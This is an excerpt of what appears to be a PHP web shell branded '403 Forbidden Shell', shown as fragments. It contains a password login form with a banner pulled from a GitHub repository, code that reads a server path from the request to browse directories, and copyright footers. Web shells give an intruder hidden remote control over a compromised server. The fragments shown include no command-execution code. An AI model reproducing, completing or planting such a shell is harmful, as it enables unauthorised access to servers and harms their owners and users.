...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <img src="https://raw.githubusercontent.com/sxlmnwb/403-Forbidden-Shell/master/403_Forbidden_Shell_Banner.png" alt="Forbidden" width="750" height="">
          <br>      
      <input type="password" name="password" placeholder="">
      <input type="submit" value=" LOGIN ">

<h1><font class="Skranji" style="color:white;font-family:'Iceland';font-size: 15px;">Copyright &copy; 2022<font color="red"> sxlzptprjkt<font color="white"> LLC</h1>
      <br>
...
<tr><td><font color="red">PATH :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo '<font color="white" size="2px"><center><br/><b>Copyright &copy; 2022 <font color="red"> sxlzptprjkt<font color="white"> LLC</a></center></font>
